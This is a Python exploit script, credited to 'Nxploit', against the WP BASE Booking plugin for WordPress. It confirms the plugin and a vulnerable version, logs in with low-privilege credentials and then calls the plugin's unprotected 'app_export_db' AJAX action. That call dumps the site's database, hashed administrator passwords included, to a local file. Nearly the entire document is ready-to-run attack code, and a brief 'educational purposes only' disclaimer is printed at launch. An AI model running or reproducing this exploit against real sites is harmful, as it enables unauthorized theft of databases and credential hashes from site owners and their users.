import requests
import argparse
import re
from colorama import Fore, Style, init
from getpass import getpass

# exploit by Nxploit 

init(autoreset=True)

def check_plugin_exists(url):
    plugin_url = f"{url}/wp-content/plugins/wp-base-booking-of-appointments-services-and-events/"
    print(f"{Fore.CYAN}Checking for the existence of the plugin at {plugin_url}...")
    try:
        response = requests.head(plugin_url, timeout=10)
        if response.status_code == 200:
            print(f"{Fore.GREEN}Plugin found! Proceeding with further checks.")
            return True
        else:
            print(f"{Fore.YELLOW}Plugin not found. The site is not vulnerable.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}An error occurred while checking the plugin: {e}")
        return False

def extract_version(version_text):
    match = re.search(r"Stable tag:\s*([0-9]+\.[0-9]+\.[0-9]+)", version_text)
    if match:
        version = match.group(1).strip()
        print(f"{Fore.YELLOW}Found version: {version}")
        return version
    return None

def check_version(url, vulnerable_version="4.9.2"):
    version_url = f"{url}/wp-content/plugins/wp-base-booking-of-appointments-services-and-events/readme.txt"
    print(f"{Fore.CYAN}Checking version at {version_url}...")
    try:
        response = requests.get(version_url, timeout=10)
        if response.status_code == 200:
            version = extract_version(response.text)
            if version:
                if version <= vulnerable_version:
                    print(f"{Fore.RED}The site is vulnerable! Version {version} detected.")
                    return True
                else:
                    print(f"{Fore.GREEN}The site is secure. Version {version} detected.")
                    return False
            else:
                print(f"{Fore.YELLOW}Version information not found in the readme.txt.")
                return False
        else:
            print(f"{Fore.RED}Failed to fetch version information. HTTP status code: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}An error occurred while checking the version: {e}")
        return False

def login_to_site(session, url, username, password):
    login_url = f"{url}/wp-login.php"
    print(f"{Fore.CYAN}Attempting to log in...")
    try:
        response = session.post(
            login_url,
            data={"log": username, "pwd": password, "wp-submit": "Log+In"},
            headers={"User-Agent": "Mozilla/5.0"},
            timeout=10,
            verify=False,
        )
        if any("wordpress_logged_in" in cookie.name for cookie in session.cookies):
            print(f"{Fore.GREEN}Logged in successfully.")
            return True
        else:
            print(f"{Fore.RED}Failed to log in. Please check your credentials.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}An error occurred during login: {e}")
        return False

def extract_database_file(session, url, output_file):
    ajax_url = f"{url}/wp-admin/admin-ajax.php"
    print(f"{Fore.CYAN}Sending POST request to export the database...")
    try:
        response = session.post(ajax_url, data={"action": "app_export_db"}, timeout=10)
        if response.status_code == 200:
            print(f"{Fore.MAGENTA}Database export request successful!")
            with open(output_file, "w", encoding="utf-8") as file:
                file.write(response.text)
            print(f"{Fore.GREEN}Database saved to {output_file}")
        else:
            print(f"{Fore.RED}Failed to export database. HTTP status code: {response.status_code}")
            print(f"{Fore.YELLOW}Response text:")
            print(response.text)
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}An error occurred while exporting the database: {e}")

def main():
    parser = argparse.ArgumentParser(
        description=f"The WP BASE Booking of Appointments, Services and Events plugin for WordPress is vulnerable to unauthorized access of data due to a missing capability check on the export_db function in all versions up to, and including, 4.9.2. This makes it possible for authenticated attackers, with Subscriber-level access and above, to expose sensitive information from the database, such as the hashed administrator password.",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument("-u", "--url", required=True, help=f"{Fore.YELLOW}Base URL of the WordPress site")
    parser.add_argument("-U", "--username", required=True, help=f"{Fore.YELLOW}WordPress username")
    parser.add_argument("-p", "--password", help=f"{Fore.YELLOW}WordPress password")
    parser.add_argument("-o", "--output", default="output.sql", help=f"{Fore.YELLOW}File to save the output (default: output.sql)")
    args = parser.parse_args()

    if not check_plugin_exists(args.url):
        print(f"{Fore.BLUE}Exiting...")
        return

    if not check_version(args.url):
        print(f"{Fore.BLUE}The site is not vulnerable. Exiting...")
        return

    session = requests.Session()
    password = args.password or getpass(f"{Fore.YELLOW}Enter your WordPress password: ")

    if not login_to_site(session, args.url, args.username, password):
        print(f"{Fore.RED}Login failed. Exiting...")
        return

    extract_database_file(session, args.url, args.output)

if __name__ == "__main__":
    print(f"{Fore.GREEN}{Style.BRIGHT}This script is provided for educational purposes only. The author is not responsible for any damages caused by the misuse of this script.")
    print(f"{Fore.GREEN}{Style.BRIGHT}Exploit by: Nxploit\n")
    main()
